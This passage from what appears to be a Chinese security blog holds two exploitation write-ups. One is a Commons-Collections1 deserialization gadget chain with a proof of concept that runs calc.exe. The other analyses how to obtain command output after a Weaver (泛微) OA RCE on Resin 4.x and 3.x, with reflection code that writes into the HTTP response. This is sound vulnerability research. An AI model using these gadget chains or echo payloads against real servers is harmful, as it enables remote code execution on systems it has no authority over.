Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    </span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射找到 漏洞触发类AnnotationInvocationHandler的class对象</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取漏洞触发类AnnotationInvocationHandler的实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化漏洞触发对象，执行恶意的转换逻辑</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="4-参考：TransformedMap介绍"><a href="#4-参考：TransformedMap介绍" class="headerlink" title="4. 参考：TransformedMap介绍"></a>4. 参考：TransformedMap介绍</h4><ul>
+<li><p>java.util.Map 是一个接口，<strong><u>简称</u></strong>为Map，jdk中有不同的实现，<strong><u>这里统称</u></strong>为jdk_map_impl（如HashMap），是<strong><u>键值对</u></strong>的集合</p>
+</li>
+<li><p>org.apache.commons.collections.map.TransformedMap <strong><u>简称</u></strong> TransformedMap ，是common-collection对Map的<strong><u>实现</u></strong>，可以对jdk中的Map的<strong><u>实现</u></strong>进行<strong><u>增强</u></strong>。</p>
+</li>
+<li><p>怎么增强？TransformedMap可以 为jdk_map_impl(如HashMap)绑定一个KEY的Transformer和一个VALUE的Transformer，在向jdk_map_impl类型的对象<strong><u>写入键值对之前</u></strong>，会<strong><u>先调用</u></strong>其绑定的KEY和VALUE的Transformer.transform转换为新的KEY’和VALUE’后再写入，代码如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TransformedMap最终会间接继承AbstractMapDecorator一个map字段，并在调用TransformedMap.decorate的时候初始化它。AbstractMapDecorator实现了java.util.Map接口。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Map map;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> 		</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//实现了java.util.Map.Entry接口的setValue方法。可以给Map中某一键值对赋值。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//调用TransformedMap.checkSetValue得到转换后的value对象</span></span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用静态方法TransformedMap.decorate，构造出一个TransformedMap对象。decorate有三个参数，可以将一个java.util.Map和key/value的Transformer绑定。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.keyTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用valueTransformer.transform对value对象进行转换</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//TransformedMap在对map字段进行填充时，会先调用相应的Transformer接口的transform方法对key/value对象进行转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>Transformer有多种实现，这里只关注三种。</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622623055344.png" alt="1622623055344"></p>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Transformer.transform输入一个类型的对象，转换成另一个类型的对象。</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置要转换的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//将传入对象转换为固定的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//传入对象，反射调用转换方法，返回转换后的对象，转换方法由传入对象的类定义。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">		Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置一个Transformer链</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//遍历Transformer链，传入对象经多个Transformer依次处理后返回</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">          object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  InvokerTransformer转换对象的流程如下(custom_method由in_obj的类自定义)：<br>  <img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622623085984.png" alt="1622623085984"></p>
+<p>  ChainedTransformer转换对象的流程如下：</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622623120376.png" alt="1622623120376"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">某微RCE回显利用分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-05-20 15:03:08" itemprop="dateCreated datePublished" datetime="2021-05-20T15:03:08+08:00">2021-05-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-25 14:03:40" itemprop="dateModified" datetime="2021-05-25T14:03:40+08:00">2021-05-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA/" itemprop="url" rel="index">
+                    <span itemprop="name">JAVA</span>
+                  </a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞利用</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        最近某微爆出RCE漏洞，本想着通过相对路径写入shell，但是不知是什么原因，在实际渗透中并没有成功，内存马这里也考虑了一下，但是由于这里的利用需要将class经过BCEL编码，由于无法将两个类进行BCEL编码，所以只能放弃了种内存马的想法，那目前最稳妥的方法就是获得命令执行的结果，让攻击者根据自己的需求去完成后续的利用。</p>
+<h2 id="Resin-4-x获取命令执行结果"><a href="#Resin-4-x获取命令执行结果" class="headerlink" title="Resin 4.x获取命令执行结果"></a>Resin 4.x获取命令执行结果</h2><p>​        有大佬已经给出了在Resin 4.x中获取回显的方法了，下面我们先学习一下他的思路。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.network.listen.TcpSocketLink"</span>); <span class="comment">//获取TcpSocketLink Class对象。</span></span><br><span class="line">    Method getCurrentRequestM = tcpsocketLinkClazz.getMethod(<span class="string">"getCurrentRequest"</span>); <span class="comment">//通过反射得到getCurrentRequest方法</span></span><br><span class="line">    Object currentRequest = getCurrentRequestM.invoke((Object)<span class="keyword">null</span>); <span class="comment">//调用getCurrentRequest方法获取返回结果</span></span><br><span class="line">    Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_responseFacade"</span>);<span class="comment">//获取_responseFacade变量</span></span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>); <span class="comment">//改变获取_responseFacade变量的访问权限</span></span><br><span class="line">    Object response = f.get(currentRequest);<span class="comment">//获取response对象</span></span><br><span class="line">    Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); <span class="comment">//获取getWriter方法</span></span><br><span class="line">    Writer w = (Writer)getWriterM.invoke(response); <span class="comment">//调用getWriter获取Writer独享</span></span><br><span class="line">    w.write(<span class="string">"powered by potatso"</span>); <span class="comment">//写入回显内容</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">    var11.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        我们先看看在resin 4.X中，如何获取response对象。为此我写了一个servlet并打印出到达servlet的调用栈。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">doGet:<span class="number">98</span>, HelloWorld</span><br><span class="line">service:<span class="number">120</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">97</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">doFilter:<span class="number">109</span>, ServletFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">10</span>, FirstFilter</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">156</span>, WebAppFilterChain (com.caucho.server.webapp)</span><br><span class="line">doFilter:<span class="number">95</span>, AccessLogFilterChain (com.caucho.server.webapp)</span><br><span class="line">service:<span class="number">314</span>, ServletInvocation (com.caucho.server.dispatch)</span><br><span class="line">handleRequest:<span class="number">843</span>, HttpRequest (com.caucho.server.http)</span><br><span class="line">dispatchRequest:<span class="number">1395</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequest:<span class="number">1351</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequestsImpl:<span class="number">1335</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequests:<span class="number">1243</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleAcceptTaskImpl:<span class="number">1037</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">runThread:<span class="number">117</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">93</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">handleTasks:<span class="number">175</span>, SocketLinkThreadLauncher (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">61</span>, TcpSocketAcceptThread (com.caucho.network.listen)</span><br><span class="line">runTasks:<span class="number">173</span>, ResinThread2 (com.caucho.env.thread2)</span><br><span class="line">run:<span class="number">118</span>, ResinThread2 (com.caucho.env.thread2)</span><br></pre></td></tr></table></figure>
+
+<p>​        Response对象主要来自于<code>com.caucho.server.http.HttpRequest#handleRequest</code></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155652633.png" alt="image-20210524155652633"></p>
+<p> <code>com.caucho.server.http.AbstractHttpRequest#getResponseFacade</code>中返回了Response对象。所以如果我们能获取到AbstractHttpRequest对象并调用该对象的getResponseFacade方法，即可获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155750330.png" alt="image-20210524155750330"></p>
+<p>​        现在的目标转到获取AbstractHttpRequest对象,再查看下类的继承关系，通过下面的继承关系可以得到，想要获取AbstractHttpRequest对象，也可以获取它的子类或者父类。当然获取父类不一定就能得到AbstractHttpRequest对象，这个和具体返回的对象是什么类型有关系。要想通过反射得到对应的对象，主要还是要寻找返回类型为该对象并且由static修饰的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static ProtocolConnection</span><br><span class="line">public static AbstractProtocolConnection</span><br><span class="line">public static AbstractHttpRequest</span><br><span class="line">public static FastCgiRequest</span><br><span class="line">public static HttpRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static HmuxRequest</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524161550917.png" alt="image-20210524161550917"></p>
+<p>​        经过一番搜索，只有下面的两个方法会返回ProtocolConnection对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163202219.png" alt="image-20210524163202219"></p>
+<p>​            先看看<code>com.caucho.ejb.util.EjbUtil#createRequestContext</code>方法，这个方法要返回ProtocolConnection的条件是需要user的内容不为Null,但实际上我通过反射调用该方法user为Null，因此不会返回ProtocolConnection对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163936899.png" alt="image-20210524163936899"></p>
+<p>​        所以只能通过<code>com.caucho.network.listen.TcpSocketLink#getCurrentRequest</code>来获取该对象，从<code>_currentRequest</code>获取对象，并且<code>_currentRequest</code>也是static类型的，所以可以通过反射拿到。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164120690.png" alt="image-20210524164120690"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164155683.png" alt="image-20210524164155683"></p>
+<p>​    但是获取的<code>ProtocolConnection</code>对象实际类型是否是我们想要的<code>AbstractHttpRequest</code>类型呢?可以尝试获取下。可以看到实际上获取的是HttpRequest对象。而HttpRequest对象是我们想要的<code>AbstractHttpRequest</code>的子类，所以是可以满足我们的要求的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524165013268.png" alt="image-20210524165013268"></p>
+<p>​        最后梳理一下Resin 4.x获取回显的思路。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过调用TcpSocketLink.getCurrentRequest()获取ProtocolConnection对象。</span><br><span class="line">2. 通过调用getResponseFacade方法获取response对象。</span><br><span class="line">3. 通过反射调用reponse对象的getWriter方法获取PrintWriter对象。</span><br><span class="line">4. 通过PrintWriter对象的write方法写入回显内容。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Resin-3-x获取命令执行结果"><a href="#Resin-3-x获取命令执行结果" class="headerlink" title="Resin 3.x获取命令执行结果"></a><strong>Resin 3.x获取命令执行结果</strong></h2><p>​        虽然上面的回显方案可以解决大部分问题，但是我本地搭建的泛微OA V8.0却不能使用上面的方案，经过分析在Resin 3.X系统中并没有<code>com.caucho.network.listen.TcpSocketLink</code>。和上面的思路类似，我们先看看在正常的使用中，系统是如何获取Response对象的。执行任意一个请求并打断点，可以看到并不是通过TcpSocketLink类到Request请求的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524171146487.png" alt="image-20210524171146487"></p>
+<p>​        在<code>com.caucho.server.connection.AbstractHttpRequest</code>中可以获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192646646.png" alt="image-20210524192646646"></p>
+<p>​        同理，查看类的继承结构，可以通过获取ServletRequest间接获取AbstractHttpRequest对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192734916.png" alt="image-20210524192734916"></p>
+<p>​    经过搜索可以在<code>com.caucho.server.dispatch.ServletInvocation#getContextRequest</code>中拿到ServletRequest对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192932012.png" alt="image-20210524192932012"></p>
